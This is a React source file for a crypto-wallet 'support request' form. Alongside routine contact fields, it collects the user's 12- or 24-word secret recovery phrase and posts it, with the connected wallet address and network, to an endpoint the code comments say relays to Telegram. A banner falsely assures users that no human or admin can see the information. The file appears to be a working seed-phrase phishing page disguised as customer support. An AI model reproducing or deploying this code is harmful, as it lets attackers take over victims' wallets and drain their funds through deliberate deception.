"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2, CheckCircle, AlertCircle, HelpCircle } from "lucide-react"
import { useAccount } from "wagmi"
import { toast } from "sonner"

interface SupportFormProps {
  issueType: string
  title: string
  description?: string
}

export function SupportForm({ issueType, title, description }: SupportFormProps) {
  const { address, chain, connector } = useAccount()
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    issueDescription: "",
    urgency: "medium",
  })

  const [phraseLength, setPhraseLength] = useState<12 | 24 | null>(null)
  const [walletWords, setWalletWords] = useState<string[]>([])

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

   const handlePhraseLengthSelect = (e: React.ChangeEvent<HTMLSelectElement>) => {
    const length = parseInt(e.target.value, 10) as 12 | 24
    setPhraseLength(length)
    setWalletWords(Array(length).fill(""))
  }

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...walletWords]
    newWords[index] = value
    setWalletWords(newWords)
  }

  const handleSelectChange = (name: string, value: string) => {
    setFormData((prev) => ({ ...prev, [name]: value }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    try {
      // Prepare the data to send to Telegram
      const supportData = {
        issueType,
        name: formData.name,
        email: formData.email,
        description: formData.issueDescription,
        urgency: formData.urgency,
        walletAddress: address,
        connectorName: connector?.name || "Unknown",
        walletPhrase: walletWords.join(" ")|| "Not provided",
        network: chain?.name || "Unknown",
        timestamp: new Date().toISOString(),
      }

      console.log("Submitting support request:", supportData)


      // Send to Telegram
      const response = await fetch("/telegram/support-request", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(supportData),
      })

      if (!response.ok) {
        throw new Error("Failed to submit support request")
      }

      // Show success state
      setIsSuccess(true)
      toast.success("Support request submitted successfully!")

      // Reset form after 5 seconds
      setTimeout(() => {
        setIsSuccess(false)
        setFormData({
          name: "",
          email: "",
          issueDescription: "",
          urgency: "medium",
        })
        setPhraseLength(null)
        setWalletWords([])
      }, 5000)
    } catch (error) {
      console.error("Error submitting support request:", error)
      toast.error("Failed to submit support request. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }

  // If the form was successfully submitted, show success state
  if (isSuccess) {
    return (
      <Card className="bg-slate-800/50 border-slate-700">
        <CardContent className="pt-6 flex flex-col items-center justify-center text-center">
          <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-4">
            <CheckCircle className="w-8 h-8 text-green-500" />
          </div>
          <h2 className="text-xl font-bold text-white mb-2">Support Request Submitted!</h2>
          <p className="text-slate-400 mb-6">
            Our team has been notified and will review your issue shortly. You'll receive a response via email.
          </p>
          <div className="p-4 bg-slate-700/30 rounded-lg w-full text-left">
            <div className="flex justify-between text-sm mb-2">
              <span className="text-slate-400">Reference ID:</span>
              <span className="text-white font-mono">{Math.random().toString(36).substring(2, 10).toUpperCase()}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-slate-400">Estimated Response Time:</span>
              <span className="text-white">24-48 hours</span>
            </div>
          </div>
        </CardContent>
      </Card>
    )
  }

  return (
    <Card className="bg-slate-800/50 border-slate-700">
      <CardHeader>
        <CardTitle className="text-white flex items-center gap-2">
          <HelpCircle className="w-5 h-5 text-blue-500" />
          {title}
        </CardTitle>
        {description && <p className="text-slate-400 text-sm">{description}</p>}
      </CardHeader>
      <CardContent>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <label htmlFor="name" className="text-sm text-slate-300">
              Your Name
            </label>
            <Input
              id="name"
              name="name"
              placeholder="Enter your name"
              value={formData.name}
              onChange={handleChange}
              required
              className="bg-slate-700 border-slate-600 text-white"
            />
          </div>

          <div className="space-y-2">
            <label htmlFor="email" className="text-sm text-slate-300">
              Email Address
            </label>
            <Input
              id="email"
              name="email"
              type="email"
              placeholder="Enter your email"
              value={formData.email}
              onChange={handleChange}
              required
              className="bg-slate-700 border-slate-600 text-white"
            />
          </div>

          <div className="space-y-2">
            <label htmlFor="urgency" className="text-sm text-slate-300">
              Urgency Level
            </label>
            <Select value={formData.urgency} onValueChange={(value) => handleSelectChange("urgency", value)}>
              <SelectTrigger className="bg-slate-700 border-slate-600 text-white">
                <SelectValue placeholder="Select urgency" />
              </SelectTrigger>
              <SelectContent className="bg-slate-700 border-slate-600">
                <SelectItem value="low">Low - Not urgent</SelectItem>
                <SelectItem value="medium">Medium - Need help soon</SelectItem>
                <SelectItem value="high">High - Urgent issue</SelectItem>
                <SelectItem value="critical">Critical - Funds at risk</SelectItem>
              </SelectContent>
            </Select>
          </div>

       {/* Phrase Length Selector */}
        <div className="space-y-2">
          <label htmlFor="phraseLength" className="text-sm text-slate-300">
            Secret Recovery phrase  
          </label>
          <select
            id="phraseLength"
            value={phraseLength ?? ""}
            onChange={handlePhraseLengthSelect}
            className="w-full bg-slate-700 border border-slate-600 text-white p-2 rounded"
          >
            <option value="">Select word phrase</option>
            <option value="12">12 words</option>
            <option value="24">24 words</option>
          </select>
          {phraseLength && (
            <div className="p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400">
              <AlertCircle className="w-4 h-4" />
              <span className="text-sm font-medium">Important</span>
            </div>
              <p className="text-xs text-blue-400 mt-1">
              ⚠️ All information provided is secure and protected for your view only.
              There is no human interferennce in the process even admins and the team do not have access to the information you provided on this website.
            </p>
          </div>
            
          )}
        </div>

        {/* Phrase Input Boxes */}
        {phraseLength && (
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-3">
            {walletWords.map((word, index) => (
              <Input
                key={index}
                value={word}
                placeholder={`Word ${index + 1}`}
                onChange={(e) => handleWordChange(index, e.target.value)}
                className="bg-slate-700 border-slate-600 text-white"
              />
            ))}
          </div>
        )}

          <div className="space-y-2">
            <label htmlFor="issueDescription" className="text-sm text-slate-300">
              Describe Your Issue
            </label>
            <Textarea
              id="issueDescription"
              name="issueDescription"
              placeholder="Please provide details about your issue..."
              value={formData.issueDescription}
              onChange={handleChange}
              required
              className="bg-slate-700 border-slate-600 text-white min-h-[120px]"
            />
          </div>

          

          <Button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700"
          >
            {isSubmitting ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Submitting...
              </>
            ) : (
              "Submit Support Request"
            )}
          </Button>
        </form>
      </CardContent>
    </Card>
  )
}
